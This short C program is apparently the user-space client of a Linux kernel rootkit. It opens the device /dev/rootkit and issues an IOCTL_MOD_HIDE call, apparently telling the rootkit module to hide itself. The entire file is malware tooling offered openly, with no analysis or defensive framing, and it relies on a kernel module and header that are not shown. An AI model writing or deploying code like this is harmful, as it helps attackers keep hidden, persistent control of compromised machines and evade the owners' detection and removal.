#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <errno.h>
#include "rootkit.h"

int main(void) {
    int fd;
    fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    if (ioctl(fd, IOCTL_MOD_HIDE) < 0) {
        perror("ioctl");
        return -1;
    }
    close(fd);
    return 0;
}
